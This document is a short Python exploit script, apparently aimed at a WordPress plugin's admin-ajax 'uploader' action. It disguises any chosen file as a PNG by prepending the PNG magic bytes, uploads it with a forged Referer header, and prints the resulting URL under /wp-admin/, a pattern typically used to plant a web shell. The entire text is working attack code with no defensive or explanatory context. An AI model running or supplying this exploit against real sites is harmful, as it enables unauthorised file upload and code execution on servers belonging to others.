#-*- coding:utf-8 -*-
import requests
import sys

def exploit(url, file_name):
    png_magic_header = b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"
    f = open(file_name, "rb")
    file_data = f.read()
    upload_file = png_magic_header + file_data
    f.close()

    payload = {
        "uploadfile":(file_name, upload_file, "application/octet-stream")
    }

    header = {
        "Referer" : url + "/wp-admin/"
    }

    exploit_url = url + "/wp-admin/admin-ajax.php?action=uploader"
    r = requests.post(exploit_url, headers=header, files=payload)

    if r.status_code == 200 and r.text == "success":
        upload_url = url + "/wp-admin/" + file_name
        print("Upload URL: " + upload_url)
    else:
        print("failed")

def main():
    if len(sys.argv) != 3:
        exit()

    args = sys.argv
    url = args[1]
    file_name = args[2]

    exploit(url, file_name)

if __name__ == '__main__':
    main()
